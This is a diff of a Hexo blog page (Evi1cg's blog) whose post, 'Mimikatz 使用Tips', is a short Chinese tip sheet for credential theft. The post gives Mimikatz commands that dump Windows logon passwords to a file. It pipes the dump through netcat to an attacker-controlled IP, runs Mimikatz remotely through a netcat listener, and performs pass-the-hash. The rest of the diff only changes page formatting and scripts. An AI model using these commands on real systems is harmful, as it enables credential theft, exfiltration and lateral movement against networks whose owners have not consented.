@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -87,18 +104,18 @@
 
 
 
-  <meta name="description" content="Mimikatz 使用Tips1.记录 Mimikatz输出：1C:\&gt;mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir 2.将输出导入到本地文件：1C:\&gt;mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords f">
+  <meta name="description" content="Mimikatz 使用Tips1.记录 Mimikatz输出：1C:\&amp;gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;amp;&amp;amp; dir 2.将输出导入到本地文件：1C:\&amp;gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::lo">
 <meta name="keywords" content="mimikatz">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mimikatz 使用Tips">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Tips_of_Mimikatz.html">
-<meta property="og:site_name" content="Evi1cg's blog">
-<meta property="og:description" content="Mimikatz 使用Tips1.记录 Mimikatz输出：1C:\&gt;mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir 2.将输出导入到本地文件：1C:\&gt;mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords f">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:description" content="Mimikatz 使用Tips1.记录 Mimikatz输出：1C:\&amp;gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;amp;&amp;amp; dir 2.将输出导入到本地文件：1C:\&amp;gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::lo">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2019-01-14T14:44:26.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mimikatz 使用Tips">
-<meta name="twitter:description" content="Mimikatz 使用Tips1.记录 Mimikatz输出：1C:\&gt;mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir 2.将输出导入到本地文件：1C:\&gt;mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords f">
+<meta name="twitter:description" content="Mimikatz 使用Tips1.记录 Mimikatz输出：1C:\&amp;gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;amp;&amp;amp; dir 2.将输出导入到本地文件：1C:\&amp;gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::lo">
 
 
 
@@ -478,19 +495,19 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><h1 id="Mimikatz-使用Tips"><a href="#Mimikatz-使用Tips" class="headerlink" title="Mimikatz 使用Tips"></a>Mimikatz 使用Tips</h1><h2 id="1-记录-Mimikatz输出："><a href="#1-记录-Mimikatz输出：" class="headerlink" title="1.记录 Mimikatz输出："></a>1.记录 Mimikatz输出：</h2><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\>mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>log sekurlsa::logonpasswords full<span class="string">""</span> <span class="keyword">exit</span> && dir</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="2-将输出导入到本地文件："><a href="#2-将输出导入到本地文件：" class="headerlink" title="2.将输出导入到本地文件："></a>2.将输出导入到本地文件：</h2><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\>mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords full<span class="string">""</span> <span class="keyword">exit</span> >> log.txt</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="3-将输出传输到远程机器："><a href="#3-将输出传输到远程机器：" class="headerlink" title="3.将输出传输到远程机器："></a>3.将输出传输到远程机器：</h2><p>Attacker执行:<br></p><figure class="highlight avrasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">E:</span>\>nc -lvp <span class="number">4444</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>Victim执行:<br></p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\>mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords full<span class="string">""</span> <span class="keyword">exit</span> | nc.exe -vv <span class="number">192.168</span>.<span class="number">52.1</span> <span class="number">4444</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+        <h1 id="Mimikatz-使用Tips"><a href="#Mimikatz-使用Tips" class="headerlink" title="Mimikatz 使用Tips"></a>Mimikatz 使用Tips</h1><h2 id="1-记录-Mimikatz输出："><a href="#1-记录-Mimikatz输出：" class="headerlink" title="1.记录 Mimikatz输出："></a>1.记录 Mimikatz输出：</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>log sekurlsa::logonpasswords full<span class="string">""</span> <span class="keyword">exit</span> &amp;&amp; dir</span><br></pre></td></tr></table></figure>
+<h2 id="2-将输出导入到本地文件："><a href="#2-将输出导入到本地文件：" class="headerlink" title="2.将输出导入到本地文件："></a>2.将输出导入到本地文件：</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords full<span class="string">""</span> <span class="keyword">exit</span> &gt;&gt; log.txt</span><br></pre></td></tr></table></figure>
+<h2 id="3-将输出传输到远程机器："><a href="#3-将输出传输到远程机器：" class="headerlink" title="3.将输出传输到远程机器："></a>3.将输出传输到远程机器：</h2><p>Attacker执行:<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">E:</span>\&gt;nc -lvp <span class="number">4444</span></span><br></pre></td></tr></table></figure></p>
+<p>Victim执行:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords full<span class="string">""</span> <span class="keyword">exit</span> | nc.exe -vv <span class="number">192.168</span>.<span class="number">52.1</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>192.168.52.1 为Attacker IP</p>
 </blockquote>
-<h2 id="4-通过nc远程执行Mimikatz："><a href="#4-通过nc远程执行Mimikatz：" class="headerlink" title="4.通过nc远程执行Mimikatz："></a>4.通过nc远程执行Mimikatz：</h2><p>Victim执行:<br></p><figure class="highlight avrasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">C:</span>\>nc -lvp <span class="number">443</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>Attacker执行:<br></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">E</span>:\><span class="selector-tag">nc</span><span class="selector-class">.exe</span> <span class="selector-tag">-vv</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.128</span> 443 <span class="selector-tag">-e</span> <span class="selector-tag">mimikatz</span><span class="selector-class">.exe</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="4-通过nc远程执行Mimikatz："><a href="#4-通过nc远程执行Mimikatz：" class="headerlink" title="4.通过nc远程执行Mimikatz："></a>4.通过nc远程执行Mimikatz：</h2><p>Victim执行:<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">C:</span>\&gt;nc -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure></p>
+<p>Attacker执行:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">E</span>:\&gt;<span class="selector-tag">nc</span><span class="selector-class">.exe</span> <span class="selector-tag">-vv</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.128</span> 443 <span class="selector-tag">-e</span> <span class="selector-tag">mimikatz</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>192.168.52.128 为Victim IP</p>
 </blockquote>
-<h2 id="5-hash传递"><a href="#5-hash传递" class="headerlink" title="5.hash传递"></a>5.hash传递</h2><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Privilege:</span>:debug</span><br><span class="line"><span class="string">sekurlsa:</span>:pth <span class="regexp">/domain:xxxx /</span><span class="string">user:</span>xxxxx /<span class="string">ntlm:</span>xxxxxx</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="5-hash传递"><a href="#5-hash传递" class="headerlink" title="5.hash传递"></a>5.hash传递</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Privilege:</span>:debug</span><br><span class="line"><span class="string">sekurlsa:</span>:pth <span class="regexp">/domain:xxxx /</span><span class="string">user:</span>xxxxx /<span class="string">ntlm:</span>xxxxxx</span><br></pre></td></tr></table></figure>
 <p>之后会弹出cmd。</p>
 
       
@@ -845,7 +862,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -856,7 +873,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -867,7 +884,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -878,7 +895,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -930,7 +947,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -992,8 +1009,6 @@
 
 
 
-  
-
 
 
 
@@ -1022,9 +1037,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1468,11 +1480,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1612,6 +1619,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
